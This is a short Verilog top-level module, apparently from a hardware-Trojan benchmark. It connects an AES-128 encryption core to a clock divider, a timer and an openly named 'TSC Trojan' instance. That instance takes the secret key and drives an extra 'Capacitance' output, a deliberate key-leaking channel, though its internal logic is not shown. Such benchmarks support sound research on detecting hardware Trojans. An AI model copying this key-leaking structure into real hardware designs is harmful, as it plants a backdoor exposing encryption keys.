`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date:    12:02:52 03/06/2013 
// Design Name: 
// Module Name:    top 
// Project Name: 
// Target Devices: 
// Tool versions: 
// Description: 
//
// Dependencies: 
//
// Revision: 
// Revision 0.01 - File Created
// Additional Comments: 
//
//////////////////////////////////////////////////////////////////////////////////
module top(
    input clk,
    input rst,
    input [127:0] state,
    input [127:0] key,
    output [127:0] result,
	output [63:0] Capacitance,
    output [15:0] delay
    );

	wire clkf;
	wire clks;
	wire [127:0] out;
	wire [127:0] result;
	
	assign result = out;

	clk_div c(clk, rst, clkf, clks);
	aes_128 AES  (clks, state, key, out); 
	TSC Trojan (rst, clks, key, Capacitance);
	timer t(clkf, rst, out, delay); 

endmodule
